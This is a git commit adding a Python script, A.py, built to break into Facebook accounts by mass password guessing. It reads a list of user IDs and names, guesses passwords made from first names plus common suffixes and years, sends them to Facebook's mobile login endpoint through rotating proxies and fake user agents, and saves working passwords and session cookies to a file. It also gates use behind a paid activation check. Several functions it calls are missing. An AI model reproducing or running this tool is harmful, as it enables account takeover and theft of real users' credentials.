8d96d8f6c87f0b1cf6e54e32f884220c2dfb6c5d
CHUTTA <153103288+CHUTTA1@users.noreply.github.com>
2024-06-18 22:16:44 +0530

    Add files via upload

---
+++ A.py
@@ -0,0 +1,466 @@
+### Import Module
+import os
+try:
+    import requests
+except ImportError:
+    print('\n [×] requests module not installed!...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [×] Futures module not installed!...\n')
+    os.system('pip install futures')
+
+try:
+    import bs4
+except ImportError:
+    print('\n [×] Bs4 module not installed!...\n')
+    os.system('pip install bs4')
+
+import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64
+from concurrent.futures import ThreadPoolExecutor as AzimVau
+from datetime import datetime
+from bs4 import BeautifulSoup
+def xoshnaw():
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "-".join(uuid)
+  print("\x1b[37;1mYOUR ID : "+id)
+  try:
+    httpCaht = requests.get("https://github.com/CHUTTA1/CHUTTA-FILE/blob/main/Active.txt").text
+    if id in httpCaht:
+      print("\033[1;92mYOUR ID IS ACTIVE...!")
+      msg = str(os.geteuid())
+      time.sleep(0.3)
+      pass
+    else:
+      print("\x1b[1;91mID ACTIVATE (telegram) INBOX  x")
+      os.system('xdg-open https://wa.me/+94781782648')
+      time.sleep(1)
+      sys.exit()
+  except:
+    sys.exit()
+    if name == '__main__':
+    	print(logo)
+    	xoshnaw()
+xoshnaw()
+ct = datetime.now()
+n = ct.month
+bulan = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64,uuid
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+pretty.install()
+CON=sol()
+#useragent
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+os.system("pip install marshal")
+try:
+	prox= requests.get('https://github.com/CHUTTA1/CHUTTA-FILE/blob/main/Active.txt').text
+	open('Approval.txt','w').write(prox)
+except Exception as e:
+	print('')
+prox=open('Approval.txt','r').read().splitlines()
+for xd in range(10000):
+	a='Mozilla/5.0 (Symbian/3; Series60/'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Nokia'
+	e=random.randrange(100, 9999)
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/535.1'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen2.append(uaku)
+
+
+	aa='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+for x in range(10):
+	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+	b=random.randrange(100, 9999)
+	c=random.randrange(100, 9999)
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	h=random.randrange(1, 9)
+	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+	j=random.randrange(1, 9)
+	k=random.randrange(1, 9)
+	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+def uaku():
+	try:
+		ua=open('Approval.txt','r').read().splitlines()
+		for ub in ua:
+			ugen.append(ub)
+	except:
+		a=requests.get('https://github.com/CHUTTA1/FILE_cloning/blob/main/Active.txt').text
+		ua=open('Approval.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n')
+		ua=open('Approval.txt','r').read().splitlines()
+# INDICATION
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+cokbrut=[]
+pwpluss,pwnya=[],[]
+# COLOUR 
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m'
+m = '\x1b[1;91m'
+k = '\033[93m' 
+h = '\x1b[1;92m' 
+hh = '\033[32m'
+u = '\033[95m' 
+kk = '\033[33m' 
+b = '\33[1;96m'
+p = '\x1b[0;34m' 
+asu = random.choice([m,k,h,u,b])
+# CONVERTER
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+def masud(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def clear():
+	os.system('clear')
+def back():
+	login()
+import marshal
+def banner():
+	clear()
+	print(f"""
+""")
+# LOGIN
+# new cooki 
+def login():
+ 
+	banner()
+		
+	
+	uuid = str(os.geteuid()) + str(os.getlogin())
+	id = "".join(uuid)
+	
+	print("")
+	print("")
+	#print('\033[1;31m%sFILE %s\033[1;31m01%s%s \033[1;31mCRACK PUBLIC %s%s%s'%(P,H,P,H,P,H,P))
+	#print('\033[1;31m%sFILE %s\033[1;31m02%s%s \033[1;31mCRACK PUBLIC (MULTI) %s%s%s'%(P,H,P,H,P,H,P))	
+	#print('\033[1;37m%sFILE %s\033[1;31m03%s%s \033[1;31mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
+	print('\033[1;37m%s%s\033[1;32m01%s%s \033[1;35mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
+	print('\033[1;37m%s%s\033[1;32m02%s%s \037EXIT %s%s%s'%(P,H,P,H,P,H,P))
+	print("")
+	DFD = input('%s%s%s%s\033[1;37m  CHOICE %s\033[1;37m : '%(N,H,N,H,M))
+	if DFD in ['','']:
+		dump_publik()
+	elif DFD in ['','']:
+		dump_massal()
+	elif DFD in ['','']:
+		follower()
+	elif DFD in ['1','01']:
+		TakeFile()
+	elif DFD in ['2','02']:
+		os.system("xdg-open  https://tx")
+		os.system("python DFD.py")
+	elif DFD in ['',' ']:
+		os.system("python DFD.py")
+	elif DFD in ['0','00']:
+		os.system('rm -rf data/DFDtoken.txt')
+		os.system('rm -rf data/DFDcookie.txt')
+		print(' [OK] LOGIN ACCOUNT ')
+		exit()
+def tahun(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tahunz = '2009'
+		elif fx[:9] in ['100000000']       :tahunz = '2009'
+		elif fx[:8] in ['10000000']        :tahunz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
+		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
+		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
+		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
+		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
+		elif fx[:6] in ['100009']          :tahunz = '2015'
+		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
+		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
+		elif fx[:5] in ['10003']           :tahunz = '2018'
+		elif fx[:5] in ['10004']           :tahunz = '2019'
+		elif fx[:5] in ['10005']           :tahunz = '2020'
+		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
+		else:tahunz=''
+	elif len(fx) in [9,10]:
+		tahunz = '2008-2009'
+	elif len(fx)==8:
+		tahunz = '2007-2008'
+	elif len(fx)==7:
+		tahunz = '2006-2007'
+	else:tahunz=''
+	return tahunz
+
+def TakeFile():
+	
+	try:
+		
+		jum = input(' NAME.txt FILE : ')
+		for line in open(jum, 'r').readlines():
+			id.append(line.strip())
+		print(' ID FILE :{h} '+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+			print(' NO CONNECTION  ')
+			exit()
+	except (KeyError,IOError):
+			print(' IS NOT FILE ')
+			time.sleep(3)
+			follower()
+#-------------[ PENGATURAN-IDZ ]---------------#
+def setting():
+	os.system('clear')
+	banner()
+	print(' FACEBOOK ID ALL : '+str(len(id)))
+	print(' [1] CRACK ALL ')
+	print("")
+
+	if ['1','01']:
+		os.system('1')
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		print('\nDFD\n')
+		exit()
+	clear()
+	banner()
+	print('[01] WI-FI 4G 2G 3G 5G ')
+	print("")
+	method.append('mobile')
+	clear()
+	banner()
+	print("""
+	1) AUTO PASS
+	 """)
+	DFD = input(' CHOICE : ')
+	if DFD in ['01','1']:
+		passwrd1()
+	if DFD in ['02','2']:
+		passwrd2()
+	if DFD in ['03','3']:
+		passwrd3()
+	if DFD in ['04','4']:
+		passwrd4()
+	if DFD in ['05','5']:
+		passwrd5()
+	if DFD in ['06','6']:
+		passwrd()
+	if DFD in ['07','7']:
+		passwrd7()
+	exit() 
+# Method Main
+def passwrd():
+	os.system('clear')
+	banner()
+	print("")
+	with tred(max_workers=50) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
+					pwv.append(nmf)
+					pwv.append(frs+'@123')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'2004')
+					pwv.append(frs+'2005')
+					pwv.append(frs+'2006')
+					pwv.append(frs+'2007')
+					pwv.append(frs+'@1234')
+
+			else:
+					pwv.append(nmf)
+					pwv.append(frs+'@123')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'2004')
+					pwv.append(frs+'2005')
+					pwv.append(frs+'2006')
+					pwv.append(frs+'2007')
+					pwv.append(frs+'@1234')
+
+			if 'ya' in pwpluss:
+				for xpwd in pwnya:
+					pwv.append(xpwd)
+			else:pass
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'mbasic' in method:
+				pool.submit(crackmbasic,idf,pwv)
+			else:
+				pool.submit(crackmbasic,idf,pwv)
+	print('')
+	exit()
+def passwrd1():
+	os.system('clear')
+	banner()
+	print("")
+	with tred(max_workers=25) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
+					pwv.append(nmf)
+					pwv.append(frs+'@123')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'2004')
+					pwv.append(frs+'2005')
+					pwv.append(frs+'2006')
+					pwv.append(frs+'2007')
+					pwv.append(frs+'@1234')
+			else:
+					pwv.append(nmf)
+					pwv.append(frs+'@123')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'2004')
+					pwv.append(frs+'2005')
+					pwv.append(frs+'2006')
+					pwv.append(frs+'2007')
+					pwv.append(frs+'@1234')
+
+
+			if 'ya' in pwpluss:
+				for xpwd in pwnya:
+					pwv.append(xpwd)
+			else:pass
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'mbasic' in method:
+				pool.submit(crackmbasic,idf,pwv)
+			else:
+				pool.submit(crackmbasic,idf,pwv)
+	print('')
+	exit()
+
+# Mobile 
+def crack(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	sys.stdout.write(f"\r FILE {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}\033[1;31mCP - {cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				
+				##print(f'\r{K}\n[ DFD-CP ]\n ID : {idf}\n PASSWORD : {pw}{N}')       
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r{H}\n\n {tahun(idf)}\n {idf} {pw}')
+				#DFD
+				open('/sdcard/Cookie-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+			elif "c_user" in po.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r{H}\n\n {tahun(idf)}\n {idf} {pw}')
+				open('/sdcard/Cookie-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.mkdir('OK')
+	except:pass
+	try:os.mkdir('CP')
+	except:pass
+	try:os.mkdir('data')
+	except:pass
+	try:os.system('touch Approval.txt')
+	except:pass
+	try:os.system('touch Approval.txt')
+	except:pass
+	login()
